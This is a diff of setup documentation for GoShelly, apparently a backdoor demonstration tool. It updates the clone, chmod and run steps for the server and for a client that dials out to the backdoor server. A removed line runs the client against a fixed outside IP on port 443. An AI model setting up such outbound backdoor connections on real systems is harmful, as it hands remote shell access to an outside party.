@@ -22,16 +22,24 @@ using the following instructions
 
     Clone the repository from GitHub
         SSH::
-        git clone git@github.com:arorasoham9/goshelly-server.git .
-
+            git clone  git@github.com:arorasoham9/cobrashelly.git
         HTTPS::
-        git clone https://github.com/arorasoham9/goshelly-server.git .
-                
-    Make the binary executable::
-        chmod +x goshelly-Serv
+            git clone https://github.com/arorasoham9/cobrashelly.git
 
-    Run the below command to make the GoShelly Server start listening::
-        ./goshelly-Serv -a
+    Change Directory::
+        cd cobrashelly    
+
+    Make the binary executable
+        For Linux::
+            chmod +x ./bin/app-amd64-linux 
+        For MacOS::
+            chmod +x ./bin/app-amd64-darwin
+
+    Run the below command to make the GoShelly Server start listening
+        For Linux::
+            ./bin/app-amd64-linux demo
+        For MacOS::
+            ./bin/app-amd64-darwin demo
 
 To use Araali's backdoor server
 ++++++++++++++++++++++++++++++++
@@ -46,22 +54,30 @@ using the following instructions
     **For Virtual Machines(VMs)**
         Clone the repository from GitHub
             SSH::
-                git clone git@github.com:arorasoham9/goShellyClient.git .
+                git clone git@github.com:arorasoham9/goshelly-client.git
             HTTPS::
-                git clone https://github.com/arorasoham9/goShellyClient.git .
+                git clone https://github.com/arorasoham9/goshelly-client.git
+
+        Change Directory::
+            cd goshelly-client  
 
         Make the binary executable::
-            chmod +x goshelly
+            For Linux::
+                chmod +x ./bin/app-amd64-linux 
+            For MacOS::
+                chmod +x ./bin/app-amd64-darwin
 
         Run the below command to make the GoShelly Client dial out to the backdoor server
-            If using Araali's backdoor servivce::
-                ./goshelly 194.195.115.136:443
-            If using your own backdoor servivce::
-                ./goshelly <ip-address>:443
+         If you choose to use Araali's backdoor service, enter **** as the IP in the below command.
+            For Linux::
+                ./bin/app-amd64-linux demo --IP=<IP-address-no-port> --SSLEMAIL=<your-email>
+            For MacOS::
+                ./bin/app-amd64-darwin demo --IP=<IP-address-no-port> --SSLEMAIL=<your-email>
+       
             
 
     **For K8S Cluster**
-    Instructions not available just yet. Awaiting helm deployment. -Soham
+    Instructions not yet available -Soham
 
 
 
